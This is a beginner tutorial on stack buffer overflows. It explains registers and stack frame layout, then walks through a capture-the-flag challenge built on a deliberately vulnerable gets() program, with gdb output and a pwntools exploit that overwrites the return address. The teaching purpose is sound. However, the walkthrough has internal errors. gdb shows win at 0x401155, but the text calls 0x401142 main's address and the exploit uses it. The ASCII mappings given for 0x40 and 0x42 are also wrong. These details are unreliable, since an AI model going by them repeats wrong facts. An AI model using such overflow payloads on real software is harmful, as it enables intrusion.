# Buffer overflows | Binary exploitation part 2

One of the most common types of vulnerabilities in C programs is buffer overflows. Exploiting buffer
overflows can range from easy to very difficult, and in this tutorial I will guide you through
exploiting the simplest type of buffer overflow.

## Where do compiled programs store variables?

To exploit buffer overflows, you first need to learn some more of the basics. There are two main
places that programs stores variables: registers and RAM. Lets take a quick tour.

### Registers

Registers are the fastest place to store variables, and whenever a program is operating on values
they must be in registers.

Modern CPUs have all sorts of registers that are used for different types of values. See Figure 2.1
for a list of common x86 64-bit registers and their purposes. Most of these registers also have
32-bit versions that are prefixed with an `e` instead of an `r`.

| Register/s                                | Purpose                                                                           |
| ----------------------------------------- | --------------------------------------------------------------------------------- |
| `rax`                                     | Often stores the return value of a function                                       |
| `rdi`, `rsi`, `rdx`, `rcx`, `r8` and `r9` | Often used to store the arguments to a function before calling it                 |
| `rip`                                     | Always stores the location of the current machine code instruction being executed |
| `rbp`                                     | Always points to the 'bottom' of the stack (more on this later)                   |
| `rsp`                                     | Always points to the 'top' of the stack (more on this later)                      |

Figure 2.1: *a list of common `x86_64` registers and their purposes*

### RAM (memory)

Programs often have many variables, and there mostly aren't enough registers to store all these
values. This is why programs need to use memory. Memory is a place where computers can store
temporary values. When a program finishes, any values stored in RAM are effectively wiped so that
the memory is ready to be used by other programs.

To refer to a particular part of memory, programs use pointers. Pointers are addresses that refer to
a particular memory location.

A program's memory is split up into multiple regions with different purposes (Figure 2.2). The parts
that we are interested in for now are the stack and the heap.

```
|-------------------| <- highest memory address
| Stack             |
|-------------------|
| ...               | <- When the stack needs more space, it grows downwards into the free space
| Free space        |
| ...               | <- When the heap needs more space, it grows upwards into the free space
|-------------------|
| Heap              |
|-------------------|
| Global variables  |
|-------------------|
| Constant data     |
|-------------------|
| Machine code      |
|-------------------| <- lowest memory address
```
Figure 2.2: *a generalised diagram of a program's memory regions*

### The heap

The heap is the region of memory that is mostly used to store data that can change in size (e.g.
lists and tables). This introduction to binary exploitation will not require any in-depth
knowledge of the heap, and therefore we will be skimming over it.

### The stack

The stack is the region of memory that a program can use to store fixed-size variables (i.e.
lists cannot be stored on the stack).

The stack is split into stack frames. Each time a function is called, it creates a new stack frame
for itself above the stack of the function that called it. The process of creating a new stack frame
will be discussed later when the x86_64 C calling convention is explained.

Stack frames have a specific layout (Figure 2.3) which is crucial to know about when exploiting
buffer overflows. In particular, you need to know that the return address is stored on the stack,
and that it's located above the local variables. The return address is the address of the machine
code instruction to return to once the current function returns. If we can control this, we can
control what part of the program will execute next, and we can force the program to do things that
it's not meant to do.

```
|          ...          |
| Previous stack frame  |
|-----------------------|
| Function parameters   | <- only exists if the function has too many arguments for all arguments to be passed via the usual registers
|-----------------------|
| Return address        | <- if we control this, we can control what code gets executed next
|-----------------------|
| Saved `rbp` value     | <- this is used to return to the previous stack frame when the function returns
|-----------------------| <- `rbp` (base pointer)
| Local variables       |
|-----------------------| <- `rsp` (stack pointer)
```
Figure 2.3: *annotated layout of a stack frame*

> **NOTE**: `rbp` always contains a higher address than `rsp` even though it points to the bottom of the
> stack, because the stack grows downwards (refer to Figure 2.2).

## Buffer overflows

In C, accessing the elements of an array using indices isn't checked at all. This means that
`myArray[5]` will attempt to give you the 6th element of `myArray` even if `myArray` contains less
than 6 elements. What value it returns depends on what values are stored in memory after the end of
the array.

> **NOTE**: When talking about C, 'array' refers to a fixed length array of elements. A variable
> length array is usually referred to as a 'list' (like in Python).

Consider the following number guessing game: A user has 8 guesses that they can change as many
times as they want until they are happy, and each time they make a guess the program will ask them
which guess they want to update. The guesses will be stored in an array. Now, what happens if I
forget to ensure that the guess the user wants to update is actually inside the array? i.e. what
would happen if a user said they want to update their 9th guess? Well, what happens depends on what
is located after the array containing the user's guesses. Lets imagine for now that the value stored
right after the array containing guesses is the secret number that the user is trying to guess. If
the user was to try and update the 9th guess, the program would obey them by updating the guess
located after their 8th guess. But, the value after the 8th guess is not a 9th guess, it's
actually the secret target number! Whatever the user inputs as their guess will actually become the
new target number. How evil!

The situation that I just described is called an out-of-bounds write vulnerability (a.k.a. oob
write). This is a type of buffer overflow. It should make a bit more sense once you try it for
yourself.

## Your first buffer overflow

You're now ready to exploit your first buffer overflow vulnerability!

The challenge that we'll be solving is called `gets_me_every_time`. As always, lets run the
executable and see what we're working with.

```console
$ ./challenge
// This is a safe way to get user input, right??
hello
hello
```

I typed in `hello` and when I hit enter the program just echoed back what I had typed in. Seems
simple enough, lets try typing in something a bit longer.

```console
$ ./challenge
// This is a safe way to get user input, right??
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault
```

Hmm, `Segmentation fault` definitely doesn't sound good, I wonder what happened there. Lets take a
look at the source code for the challenge and see what might be causing this odd behaviour.

```c
#include <stdio.h>
#include <stdlib.h>

void win() {
  system("/bin/cat flag.txt");
}

int main() {
  char buf[32];

  puts("// This is a safe way to get user input, right??");
  gets(buf);
  puts(buf);
  return 0;
}
```

First, lets identify what we need to do to solve the challenge. It seems like if we can trick the
program into running the `win` function, the program will print out the flag.

### Finding the vulnerability

Now we just need to find the vulnerable code. Luckily, the challenge creator was kind and left us a
few hints. The program prints out `// This is a safe way to get user input, right??` just before
using the `gets` function to get the user's input and save it in `buf` (`gets` is short for get
string). The challenge title also includes the word `gets`, so I think the `gets` function is
probably a good place to start looking. We can find out more about this C function by running the
command `man gets` (`man` is a handy manual installed on macOS and Linux).

> Never use gets().  Because it is impossible to tell without knowing the data in advance how many
> characters gets() will read, and because gets() will continue to store characters past the end of
> the buffer, it is extremely dangerous to use.  It has been used to break computer security.  Use
> fgets() instead.

Well, the developer of this program clearly didn't read the manual! `gets` is an old function that
was almost completely removed from C (it still exists as to not break old programs that still use
it). Now, how can we use this vulnerability to change a program's execution? Well, the user's input
is stored into a 32 character array, but `gets` will just keep storing the user's input until they
hit enter. This means that the user can overwrite as much data past the end of the buffer as they
want. The array is stored in the stack as a local variable, so lets refer back to Figure 2.3 to see
what values might be located after the end of the array.

The local variables are located at the top of the stack, so by writing past the end of the `buf`
array we can overwrite any values on the stack that we want (remember that the stack is backwards
and grows downwards). The value that we want to overwrite is called the return address. It is stored
on the stack so that when a function returns, the CPU knows which code to run next. Overriding this
value with the address of the `win` function will make sure that when the `main` function returns,
`win` will be executed instead of whatever would usually be run after `main`.

The layout of `main`'s stack frame will look something like the following:

| Value       | Size (bytes) |
| ----------- | ------------ |
| `buf`       | 32           |
| saved `rbp` | 8            |
| return addr | 8            |

To reach the return address we will need to write 40 bytes (size of `buf` plus size of saved `rbp`).

### Testing the vulnerability

Lets see this in action by running the program in a debugger (`gdb`) and observing the crash. I will
enter 48 `a`s with the 41st `a` replaced with a `b`. This means that we would expect the first byte
of the return address to be `0x62` (the number that represents `b`) and the rest of the bytes to be
`0x61` (the number that represents `a`).

```console
$ gdb ./challenge
gdb) run
Starting program: /root/shared/CyberSecurityClub/BinaryExploitation/gets_me_every_time/challenge
// This is a safe way to get user input, right??
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabaaaaaaa

Program received signal SIGSEGV, Segmentation fault.
gdb) info frame
Stack level 0, frame at 0x7fffffffeb18:
 rip = 0x40118c in main; saved rip = 0x6161616161616162
```

After the program crashed I ran `info frame` to inspect the current stack frame, and low-and-behold,
the saved `rip` value (a.k.a. the return address) is now `0x6161616161616162`. You may be wondering
why the last byte is `0x62` instead of the first byte. This is because numbers are stored backwards
by modern CPUs, but text is not. Therefore when we overwrite a number with text, we need to reverse
the value before we type it.

### Finding the address of `win`

Now that we have confirmed that this works how we expected it to, we need to find out what the
address of the `win` function is. This is pretty easy to do with `gdb` using the command `p win`.

```console
$ gdb ./challenge
gdb) p win
$2 = {<text variable, no debug info>} 0x401155 <win>
```

This tells us that the address of main is `0x401142`. But how do we type that address into the
program? This address has three non-zero bytes, `0x40`, `0x11` and `0x42`. `0x40` can be typed as `B`
and `0x42` can be typed as `U`, however, `0x11` is not a typable character. This is where `pwntools`
comes in handy.

### Creating the exploit

To create an exploit that solves this challenge, we will need to use `pwntools`. `pwntools` is a
super useful Python package that has everything required to be able to automate the exploitation of
a program. Install `pwntools` by running `pip3 install pwntools`.

To start the exploit, we will run the challenge program using the `process` function. We will then
construct a payload with 40 `a`s (could be any characters) followed by the address of `win`, and
then get `pwntools` to 'type' this payload into the program.

```python
from pwn import *

p = process('./challenge')

payload  = b'a' * 32     # Fill `buf`
payload += b'a' * 8      # Overwrite saved `rbp` (we don't care what its value is)
payload += p64(0x401142) # Convert the address of `win` to a series of characters

p.sendline(payload)      # Automatically type the payload into the program and hit enter
print(p.recvall())       # Wait until the program finishes and then print out all of its output
```

Running this exploit using `python3 exploit.py` gives the following output:

```
// This is a safe way to get user input, right??
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaB\x11@
flag{mayb3_1_5h0u1d_g0_back_t0_c_5ch0o1}
```

### Congratulations!

The program printed the flag after echoing what our exploit typed in. You just exploited your first
buffer overflow vulnerability!

The program did run into a segmentation fault, but that was after it printed out the flag, so we
don't really care about that for this challenge.

### Making pwntools do more of the work for us

We can clean up this exploit a bit by using the `ELF` class to extract the address of `win` from the
binary.

```python
# ...
p = process('./challenge')
elf = ELF('./challenge')
# ...
payload += p64(elf.functions["win"].address) # This replaces line 7 of the original exploit
# ...
```

## An additional challenge

If you want to try a harder challenge, give `like_an_onion` a go. Don't feel bad if you can't solve
it without some hints, it's quite a bit harder than `gets_me_every_time`.
